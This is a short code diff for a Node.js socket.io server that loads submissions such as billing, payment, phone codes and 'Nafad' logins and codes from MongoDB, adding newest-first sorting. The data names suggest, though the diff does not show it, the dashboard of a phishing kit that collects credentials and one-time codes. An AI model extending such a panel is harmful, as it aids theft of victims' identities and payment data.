@@ -58,7 +58,6 @@ io.on("connection", (socket) => {
       comprehensiveArr,
       billingArr,
       paymentArr,
-      //  visits,
       phoneSubs,
       phoneCodes,
       thirdPartys,
@@ -66,18 +65,17 @@ io.on("connection", (socket) => {
       nafadLogins,
       nafadCodes,
     ] = await Promise.all([
-      IndexSubmission.find().lean(),
-      Details.find().lean(),
-      Comprehensive.find().lean(),
-      Billing.find().lean(),
-      Payment.find().lean(),
-      //    Visit.find().lean(),
-      phone.find().lean(), // your `phone` model
-      PhoneCode.find().lean(),
-      ThirdParty.find().lean(),
-      Verification.find().lean(),
-      Nafad.find().lean(),
-      NafadCode.find().lean(),
+      IndexSubmission.find().sort({ _id: -1 }).lean(),
+      Details.find().sort({ _id: -1 }).lean(),
+      Comprehensive.find().sort({ _id: -1 }).lean(),
+      Billing.find().sort({ _id: -1 }).lean(),
+      Payment.find().sort({ _id: -1 }).lean(),
+      phone.find().sort({ _id: -1 }).lean(),
+      PhoneCode.find().sort({ _id: -1 }).lean(),
+      ThirdParty.find().sort({ _id: -1 }).lean(),
+      Verification.find().sort({ _id: -1 }).lean(),
+      Nafad.find().sort({ _id: -1 }).lean(),
+      NafadCode.find().sort({ _id: -1 }).lean(),
     ]);
 
     // gather flags & locations
@@ -91,7 +89,6 @@ io.on("connection", (socket) => {
       comprehensive: comprehensiveArr,
       billing: billingArr,
       payment: paymentArr,
-      //   visits, // raw visit history
       phoneSubs, // phone submissions
       phoneCodes, // phone-code submissions
       thirdPartys,
